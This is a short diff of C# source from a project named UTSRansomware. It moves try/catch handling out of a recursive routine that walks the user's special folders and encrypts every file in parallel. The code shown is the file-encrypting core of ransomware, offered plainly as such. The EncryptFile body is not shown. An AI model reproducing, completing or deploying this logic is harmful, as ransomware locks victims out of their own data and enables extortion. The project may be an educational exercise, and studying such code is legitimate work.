@@ -30,39 +30,39 @@ namespace UTSRansomware
                 string folderPath = Environment.GetFolderPath(folder);
                 if (Directory.Exists(folderPath))
                 {
-                    EncryptDirectory(folderPath);
+                    try
+                    {
+                        EncryptDirectory(folderPath);
+                    }
+                    catch (UnauthorizedAccessException)
+                    {
+                        Console.WriteLine($"Access denied to: {folderPath}. Skipping...");
+                    }
+
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine(ex.ToString());
+                    }
+
                 }
             }
         }
 
         // Encrypts all files in a directory, recursviely calls istelf to encrypt files in sub directories
-        public void EncryptDirectory(string parentDirectory)
+        private void EncryptDirectory(string parentDirectory)
         {
-            try
-            {
-                string[] filePaths = Directory.GetFiles(parentDirectory);
-                string[] directoryPaths = Directory.GetDirectories(parentDirectory);
+            string[] filePaths = Directory.GetFiles(parentDirectory);
+            string[] directoryPaths = Directory.GetDirectories(parentDirectory);
 
-                foreach (string directoryPath in directoryPaths)
-                {
-                    EncryptDirectory(directoryPath);
-                }
-
-                Parallel.ForEach(filePaths, (filePath) =>
-                {
-                    EncryptFile(filePath);
-                });
-            }
-            catch (UnauthorizedAccessException)
+            foreach (string directoryPath in directoryPaths)
             {
-                Console.WriteLine($"Access denied to: {parentDirectory}. Skipping...");
+                EncryptDirectory(directoryPath);
             }
 
-            catch (Exception ex)
+            Parallel.ForEach(filePaths, (filePath) =>
             {
-                Console.WriteLine(ex.ToString());
-            }
-
+                EncryptFile(filePath);
+            });
         }
 
         // Encrypts a file
